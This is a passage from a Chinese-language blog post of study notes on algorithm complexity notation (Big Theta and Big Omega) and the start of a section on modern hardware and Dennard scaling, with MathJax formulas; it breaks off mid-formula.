<li><strong>含义</strong>：Big Theta 描述的是算法的时间复杂度的
<strong>渐近精确界限</strong>，即算法的执行时间随着输入规模增大时，会以
f(n) 作为界限的上下界增长。</li>
<li><strong>表示法</strong>：如果某个算法的时间复杂度是
Θ(f(n))，意味着该算法在最坏和最好情况下的时间复杂度都与 f(n)
成正比，并且在足够大的输入规模下，算法的时间复杂度将在 f(n)
的一个常数范围内波动。</li>
<li><strong>例子</strong>：如果某个算法的时间复杂度是
<code>Θ(n log n)</code>，这意味着无论最坏情况还是最好情况，它的时间复杂度都是与
n log n 成正比的。</li>
</ul>
<p><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="47.369ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 20937.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1373.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(1874,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(2424,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2813,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3413,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4079.8,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(5135.6,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mo" transform="translate(5839.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6228.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6828.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7495.3,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="msub" transform="translate(8551.1,0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(9924.9,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(10425.1,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(10975.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(11364.1,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(11964.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mstyle" transform="translate(12353.1,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mtext" transform="translate(13353.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><text data-variant="normal" transform="translate(389,0) scale(1,-1)" font-size="884px" font-family="serif">对</text><text data-variant="normal" transform="translate(1389,0) scale(1,-1)" font-size="884px" font-family="serif">于</text><text data-variant="normal" transform="translate(2389,0) scale(1,-1)" font-size="884px" font-family="serif">足</text><text data-variant="normal" transform="translate(3389,0) scale(1,-1)" font-size="884px" font-family="serif">够</text><text data-variant="normal" transform="translate(4389,0) scale(1,-1)" font-size="884px" font-family="serif">大</text><text data-variant="normal" transform="translate(5389,0) scale(1,-1)" font-size="884px" font-family="serif">的</text><path data-c="20" d="" transform="translate(6389,0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(6639,0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(7195,0)"></path></g></g></g></svg></mjx-container></span></p>
<p>其中，C₁ 和 C₂ 是常数，n 是输入规模。</p>
<ol start="3" type="1">
<li><strong>Big Omega (大 Ω)</strong></li>
</ol>
<ul>
<li><strong>定义</strong>：Big Omega 符号用于表示算法的
<strong>下界</strong>，即算法的 <strong>最好情况</strong>
时间复杂度。</li>
<li><strong>含义</strong>：Big Omega
描述的是在最好的情况下，算法的时间复杂度的最小增长速率。它给出了一个算法执行所需时间的下限，表示即使在最理想的情况下，算法的执行时间也不会低于某个特定的增长速率。</li>
<li><strong>表示法</strong>：如果某个算法的时间复杂度是
Ω(f(n))，意味着对于足够大的输入规模 n，算法的时间复杂度至少会增长到与
f(n) 成正比的某个常数倍。</li>
<li><strong>例子</strong>：如果某个算法的时间复杂度是
<code>Ω(n)</code>，这意味着在最佳情况下，算法的运行时间至少与 n
成正比。</li>
</ul>
<p><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="34.864ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 15410 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mo" transform="translate(704,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1093,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1693,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2359.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(3415.6,0)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(4397.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(4898,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(5448,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5837,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6437,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mstyle" transform="translate(6826,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mtext" transform="translate(7826,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><text data-variant="normal" transform="translate(389,0) scale(1,-1)" font-size="884px" font-family="serif">对</text><text data-variant="normal" transform="translate(1389,0) scale(1,-1)" font-size="884px" font-family="serif">于</text><text data-variant="normal" transform="translate(2389,0) scale(1,-1)" font-size="884px" font-family="serif">足</text><text data-variant="normal" transform="translate(3389,0) scale(1,-1)" font-size="884px" font-family="serif">够</text><text data-variant="normal" transform="translate(4389,0) scale(1,-1)" font-size="884px" font-family="serif">大</text><text data-variant="normal" transform="translate(5389,0) scale(1,-1)" font-size="884px" font-family="serif">的</text><path data-c="20" d="" transform="translate(6389,0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(6639,0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(7195,0)"></path></g></g></g></svg></mjx-container></span></p>
<p>其中，C 是常数，n 是输入规模。</p>
<p>总结来说，从精确计算操作数到使用渐近复杂度分析的转变，是计算机硬件性能提高的结果，表明对于大规模输入来说，算法的扩展行为比具体的时间或操作数更为重要。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/complexity.jpg" class="">
<blockquote>
<p>Under the promise that computers will eventually become fast enough
to handle any <em>sufficiently large</em> input in a reasonable amount
of time, asymptotically faster algorithms will always be faster in
real-time too, regardless of the hidden constant.</p>
<p>But this promise turned out to be not true — at least not in terms of
clock speeds and instruction latencies — and in this chapter, we will
try to explain why and how to deal with it.</p>
</blockquote>
<p>这里存在一个假设，就是在渐进分析上更快的算法会在实际运行时间上也会更快。但这个假设实际上是错误的，之后具体的篇章讲述了详细的原因以及处理方式。</p>
<h4 id="现代硬件">现代硬件</h4>
<p>芯片的出现极大降低了电脑的成本，是一个革命性的发明。微芯片的制造过程，主要是通过<strong>光刻（photolithography）</strong>技术在晶体硅片上“打印”电路。</p>
<p>根据Dennard
Scaling理论，当晶体管尺寸缩小约30%时，会发生以下变化：</p>
<ul>
<li><strong>晶体管密度翻倍</strong>：晶体管数量增加，能在相同面积内放置更多的晶体管。因为
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="9.788ex" height="2.027ex" role="img" focusable="false" viewBox="0 -874 4326.1 896"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,403.1) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1992.3,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mn" transform="translate(3048.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)"></path></g></g></g></svg></mjx-container></span></li>
<li><strong>时钟速度增加40%</strong>：由于晶体管变小，其开关速度加快，时钟频率能够提高。因为
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex;" xmlns="http://www.w3.org/2000/svg" width="8.949ex" height="2.773ex" role="img" focusable="false" viewBox="0 -864.9 3955.2 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(495.1,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 